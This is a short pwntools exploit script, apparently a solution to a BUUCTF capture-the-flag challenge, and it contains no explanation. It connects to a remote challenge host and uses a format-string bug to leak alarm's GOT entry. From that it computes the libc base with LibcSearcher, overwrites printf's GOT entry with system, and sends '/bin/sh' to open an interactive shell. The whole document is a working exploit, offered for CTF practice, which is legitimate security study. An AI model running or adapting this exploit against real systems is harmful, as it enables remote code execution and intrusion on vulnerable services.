from pwn import *
from LibcSearcher import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29861)
elf = ELF('./pwn')
io.sendlineafter(b'Please tell me:', b'a%9$s' + p32(elf.got['alarm']))
io.recvuntil(b'Repeater:a')
alarm = u32(io.recv(4))
print(hex(alarm))
libc = LibcSearcher('alarm', alarm)
base = alarm - libc.dump('alarm')
print(hex(base))
sys = base + libc.dump('system')
print(hex(sys))
payload = b'|| deadbeef||'
payload += fmtstr_payload(11, {elf.got['printf']: sys}, numbwritten=22)
print(payload)
io.sendlineafter(b'Please tell me:', payload)
io.sendline(b'|| /bin/sh')
io.interactive()